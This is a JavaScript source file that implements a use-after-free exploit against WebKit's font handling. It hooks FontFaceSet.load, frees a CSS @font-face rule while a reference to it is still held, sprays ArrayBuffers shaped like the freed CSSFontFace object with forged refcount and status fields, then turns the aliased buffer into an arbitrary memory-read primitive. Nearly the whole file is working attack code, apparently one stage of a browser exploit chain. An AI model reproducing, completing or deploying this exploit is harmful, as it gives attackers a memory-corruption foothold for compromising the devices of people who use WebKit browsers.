// userland.js — UAF trigger via FontFaceSet.load hook + captured B reference

const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;

// ─── Memory helpers ──────────────────────────────────────
function memUsage() {
  if (typeof performance !== "undefined" && performance.memory) {
    return {
      used:  performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit,
    };
  }
  return null;
}

function memLog(label) {
  const m = memUsage();
  if (m) {
    logger.debug(
      `[mem:${label}] used=${(m.used / 1048576).toFixed(2)}MB ` +
      `total=${(m.total / 1048576).toFixed(2)}MB ` +
      `cap=${(m.limit / 1048576).toFixed(0)}MB`
    );
  }
}

function assertMemoryHeadroom(extraBytes, stage) {
  const m = memUsage();
  if (!m) return;
  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
    throw new Error(
      `OOM guard at ${stage}: ` +
      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
    );
  }
}

// ─── FontFace property probe (never throws) ──────────────
function probeFace(face) {
  if (!face) return null;
  const out = { family: "?", unicodeRange: "?", status: "?" };
  try { out.family = face.family; } catch (e) { out.family = `<err:${e.message.slice(0,20)}>`; }
  try { out.unicodeRange = face.unicodeRange; } catch (e) { out.unicodeRange = `<err:${e.message.slice(0,20)}>`; }
  try { out.status = face.status; } catch (e) { out.status = `<err:${e.message.slice(0,20)}>`; }
  return out;
}

// ─── init_rw ─────────────────────────────────────────────
async function init_rw(opts = {}) {
  const sprayCount    = opts.sprayCount    ?? 0x10;
  const loadTimeoutMs = opts.loadTimeoutMs ?? 3000;

  logger.info(`Initiate UAF (sprayCount=${sprayCount}, timeout=${loadTimeoutMs}ms)`);
  memLog("start");

  // ── FontFace A: guaranteed-resolving source ──
  const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  // ── Style element with spray + victim rules ──
  const style = document.createElement("style");
  document.head.appendChild(style);

  const sprayRule =
    `@font-face{font-family:spray;src:local(monospace);unicode-range:U+0043}`;
  const uafRule =
    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;

  const half = Math.floor(sprayCount / 2);

  for (let i = 0; i < half; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule pre ${i}: ${e.message}`); }
  }

  const uafRuleIndex = style.sheet.cssRules.length;
  try { style.sheet.insertRule(uafRule, style.sheet.cssRules.length); }
  catch (e) { throw new Error(`insertRule victim: ${e.message}`); }

  for (let i = half; i < sprayCount; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
  }

  // ── Materialise CSSFontFace objects ──
  void document.body.offsetTop;
  logger.debug("[uaf] CSSFontFace objects materialised");

  // ── Snapshot document.fonts BEFORE the free ──
  // The victim (family "b") will be removed from document.fonts the
  // instant its rule is deleted. We must hold a JS reference now.
  const faceSnapshot = [];
  let uafCandidate = null;

  for (const f of document.fonts) {
    faceSnapshot.push(f);
    if (!uafCandidate) {
      try {
        if (f.family === "b") uafCandidate = f;
      } catch (_) {}
    }
  }

  logger.debug(`[uaf] snapshot: ${faceSnapshot.length} faces in document.fonts`);
  for (const f of faceSnapshot) {
    const p = probeFace(f);
    logger.debug(`[uaf]   family=${p.family} range=${p.unicodeRange} status=${p.status}`);
  }

  if (!uafCandidate) {
    throw new Error(
      `Victim FontFace (family "b") not present in document.fonts. ` +
      `Snapshot had ${faceSnapshot.length} faces.`
    );
  }
  logger.info(`Captured victim FontFace: family="${uafCandidate.family}" range="${uafCandidate.unicodeRange}"`);

  // ── Prepare spray slot array ──
  const abs      = new Array(sprayCount);
  const abSize   = constants.wk_CSSFontFace_sizeof;
  const origThen = FontFace.prototype.then;
  const origLoad = FontFaceSet.prototype.load;

  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");

  // ── One-shot free work ──
  let freed = false;
  let freeError = null;

  const doFreeWork = () => {
    if (freed) return;
    freed = true;

    logger.debug("[free] ENTER");

    // 1. Free victim's CSS rule (removes CSSFontFace from the set)
    try {
      style.sheet.deleteRule(uafRuleIndex);
      logger.debug("[free] victim rule deleted");
    } catch (e) {
      logger.error(`[free] deleteRule victim: ${e.message}`);
    }

    // 2. Free neighbours
    for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
      const rule = style.sheet.cssRules[i];
      if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
        try { style.sheet.deleteRule(i); } catch (_) {}
      }
    }
    logger.debug("[free] neighbour rules deleted");

    // 3. Force CSSFontFace deconstruction
    void document.body.offsetTop;

    // 4. Detach style element
    try { style.remove(); } catch (_) {}
    try { document.head.removeChild(style); } catch (_) {}

    // 5. Spray ArrayBuffers sized to CSSFontFace
    let allocated = 0;
    for (let i = 0; i < abs.length; i++) {
      try {
        const ab = new ArrayBuffer(abSize);
        const view = new DataView(ab);

        view.setBInt(8, 1, true);                             // refcount
        view.setUint8(constants.wk_CSSFontFace_m_status, 3);  // Status::Success

        if (version.major >= 13) {
          const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
        }

        abs[i] = ab;
        allocated++;
      } catch (e) {
        freeError = `ArrayBuffer ${i}/${abs.length}: ${e.message}`;
        logger.error(`[free] ${freeError}`);
        break;
      }
    }
    logger.debug(`[free] allocated ${allocated}/${abs.length}`);
    logger.debug("[free] EXIT");
  };

  // ── Fallback: FontFace.prototype.then getter ──
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) doFreeWork();
      return undefined;
    },
  });

  // ── Primary trigger: hook FontFaceSet.prototype.load ──
  // WebKit collects matching faces AFTER load() returns, inside a
  // microtask. So we schedule doFreeWork() in a microtask too,
  // immediately after load() has had a chance to collect faces.
  let hookScheduled = false;

  FontFaceSet.prototype.load = function (font, text) {
    const p = origLoad.call(this, font, text);
    if (!hookScheduled) {
      hookScheduled = true;
      Promise.resolve().then(() => {
        try { doFreeWork(); }
        catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
      });
    }
    return p;
  };

  // ── Fire load() ──
  logger.debug("[uaf] calling document.fonts.load via hooked prototype");
  let loadPromise;
  try {
    loadPromise = document.fonts.load("1em a, b", "AB");
  } catch (e) {
    logger.error(`[uaf] load() threw synchronously: ${e.message}`);
    loadPromise = Promise.resolve([]);
  }
  loadPromise.catch(() => {});

  // ── Restore prototypes immediately ──
  FontFaceSet.prototype.load = origLoad;
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: origThen,
  });

  // ── Wait for microtask + settle ──
  await Promise.race([
    loadPromise.catch(() => "rejected"),
    new Promise(r => setTimeout(() => r("timeout"), loadTimeoutMs)),
  ]);

  // Give the microtask a moment if it hasn't already run
  await Promise.resolve();

  logger.debug(`[uaf] freed=${freed} hookScheduled=${hookScheduled}`);

  if (freeError) throw new Error(`free work error: ${freeError}`);

  if (!freed) {
    const aP = probeFace(A);
    logger.error(`[diag] A: family=${aP.family} range=${aP.unicodeRange} status=${aP.status}`);
    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
    throw new Error(
      `UAF free work never ran. hookScheduled=${hookScheduled}. ` +
      `A.status=${aP.status}.`
    );
  }

  memLog("post-uaf");

  // ── Check victim state after free ──
  const afterP = probeFace(uafCandidate);
  logger.info(
    `[uaf] victim after free: family="${afterP.family}" ` +
    `range="${afterP.unicodeRange}" status="${afterP.status}"`
  );

  // If the wrapper is detached, every property would be an error string.
  const wrapperDead =
    typeof afterP.family === "string" &&
    afterP.family.startsWith("<err:");

  if (wrapperDead) {
    throw new Error(
      `Victim JS wrapper was detached — its C++ FontFace was destroyed. ` +
      `family="${afterP.family}"`
    );
  }

  // ── Find the aliased ArrayBuffer (refcount 2) ──
  let uaf_ab = null;
  let uaf_ab_index = -1;
  for (let i = 0; i < abs.length; i++) {
    const ab = abs[i];
    if (!ab) continue;
    try {
      const v = new DataView(ab);
      if (v.getBInt(8, true).eq(2)) {
        uaf_ab = ab;
        uaf_ab_index = i;
        break;
      }
    } catch (_) { /* skip */ }
  }

  if (!uaf_ab) {
    // No buffer has refcount 2 — spray may not have landed on the freed slot.
    // Log the refcounts so we can see what we got.
    const counts = [];
    for (let i = 0; i < abs.length; i++) {
      if (!abs[i]) { counts.push("-"); continue; }
      try {
        counts.push(new DataView(abs[i]).getBInt(8, true).toString());
      } catch (_) { counts.push("?"); }
    }
    logger.error(`[diag] refcounts: ${counts.join(",")}`);
    throw new Error(
      `Unable to find ArrayBuffer with refcount 2 — spray missed the freed slot.`
    );
  }
  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);

  // ── Free everything else ──
  for (let i = 0; i < abs.length; i++) {
    if (i !== uaf_ab_index) abs[i] = null;
  }
  abs.length = 0;
  faceSnapshot.length = 0;
  try { document.fonts.delete(A); } catch (_) {}

  memLog("post-reclaim");

  // ── Read primitive ──
  const self = {
    uaf_ab,
    uaf_font: uafCandidate,   // we captured it earlier
    probe: () => probeFace(uafCandidate),

    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          const pay_off = tag_off + 8;

          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
          uaf_view.setBInt(pay_off, ptr, true);
        } else {
          uaf_view.setBInt(
            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },

    cleanup() {
      try { document.fonts.clear(); } catch (_) {}
      self.uaf_ab = null;
      self.uaf_font = null;
    },
  };

  return self;
}
